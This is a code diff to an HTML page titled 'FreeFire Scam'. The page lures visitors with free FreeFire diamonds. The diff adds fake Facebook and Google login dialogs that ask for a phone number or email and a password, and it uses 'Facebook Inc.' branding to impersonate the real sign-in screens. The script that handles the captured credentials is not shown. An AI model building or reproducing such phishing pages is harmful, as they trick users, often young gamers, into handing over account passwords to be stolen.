@@ -3,7 +3,7 @@
 	<head>
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>Media</title>
+		<title>FreeFire Scam</title>
 		<link rel="stylesheet" type="text/css" href="style.css">
 		<link rel="preconnect" href="https://fonts.googleapis.com">
 		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -27,21 +27,40 @@
 					<h3>Enter Number of Diamonds</h3>
 					<input id="num-in" type="number" value="1000" max="1000"><br>
 					<input id="C-W-F" type="button" class="fa-brands fa-facebook" value="Continue with facebook" onclick="FBlogin()"><br>
-					<input id="C-W-G" type="button" value="Continue with google"><br>
+					<input id="C-W-G" type="button" value="Continue with google" onclick="Googlelogin()"><br>
 					<input id="btn-in" type="button" value="Redeem" onclick="loginOnClick()">
 				</div>
 			</div>
 		</div>
 		
-		<div class="login" id="login">
-			<div id=title-holder><h3 id="title">facebook</h3></div>
+		<div class="login" id="fblogin">
+			<div id=title-holder>
+				<h3 id="title">facebook</h3>
+				<button id="btn" onclick="FBlogin()">X</button>
+			</div>
 			<div class="login-container">
 				<img src="images/image002.jpg">
 				<h4>Log in to your Facebook account to<br>connect to FreeFire</h4>
-				<input id="mobile-no" type="number" placeholder="Mobile Number"/><br>
+				<input id="mobile-no" type="email" placeholder="Phone Number"/><br>
 				<input id="password" type="password" placeholder="password"/><br>
 
-				<input id="login-btn" type="button" value="Log In" onclick="loginOnClick()">
+				<input id="login-btn" type="button" value="Log In" onclick="FBloginOnClick()">
+				<h6>Facebook Inc.</h6>
+			</div>
+		</div>
+
+		<div id="googlelogin">
+			<div id=title-holder>
+				<h3 id="title">Google</h3>
+				<button id="btn" onclick="Googlelogin()">X</button>
+			</div>
+			<div class="login-container">
+				<img src="images/image002.jpg">
+				<h4>Log in to your Google account to<br>connect to FreeFire</h4>
+				<input id="email" type="number" placeholder="Email"/><br>
+				<input id="password" type="password" placeholder="password"/><br>
+
+				<input id="login-btn" type="button" value="Sign In" onclick="GoogleloginOnClick()">
 				<h6>Facebook Inc.</h6>
 			</div>
 		</div>
